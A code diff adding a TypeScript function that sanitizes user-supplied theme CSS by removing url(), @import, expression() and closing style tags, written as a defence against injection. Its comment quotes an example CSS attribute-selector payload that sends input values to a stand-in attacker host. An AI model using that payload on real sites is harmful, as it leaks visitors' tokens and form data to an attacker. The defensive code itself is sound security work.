@@ -1,5 +1,35 @@
 import { URL } from 'node:url'
 
+/**
+ * Sanitizes theme CSS before it's stored and injected into every public page's <head>
+ * (see server/plugins/theme-resolver.ts). Theme CSS is purely declarative styling —
+ * colors, spacing, typography via CSS custom properties — and never legitimately needs
+ * to load external resources (fonts/images are handled through dedicated site settings,
+ * not theme CSS). So `url()` and `@import` are stripped entirely rather than allow-listed.
+ *
+ * This closes the CSS attribute-selector exfiltration technique — e.g.
+ * `input[value^="a"] { background: url(https://evil.com/?leak=a) }`, which can leak DOM
+ * attribute values (tokens, form state) character-by-character to an attacker's server
+ * purely from CSS matching, no JavaScript required — plus @import-based external
+ * stylesheet loading and the legacy IE `expression()` code-execution vector.
+ */
+export function sanitizeThemeCss(css: string): string {
+  let out = css
+  // Strip comments first so a payload can't hide/split a dangerous construct across
+  // one (e.g. "@im/* */port").
+  out = out.replace(/\/\*[\s\S]*?\*\//g, '')
+  // Strip @import (external stylesheet loading). Matches through the first semicolon;
+  // over-consuming on malformed input (missing semicolon) fails closed, not open.
+  out = out.replace(/@import\b[^;]*;?/gi, '')
+  // Strip url(...) entirely everywhere it appears.
+  out = out.replace(/url\s*\([^)]*\)/gi, 'none')
+  // Strip legacy IE CSS expression() (arbitrary script execution in old IE).
+  out = out.replace(/\bexpression\s*\([^)]*\)/gi, 'none')
+  // Prevent breaking out of the <style> block it's injected into.
+  out = out.replace(/<\/style>/gi, '')
+  return out
+}
+
 function isPrivateIPv4(host: string): boolean {
   // Check if standard dot-decimal IPv4 representation
   if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(host)) return false
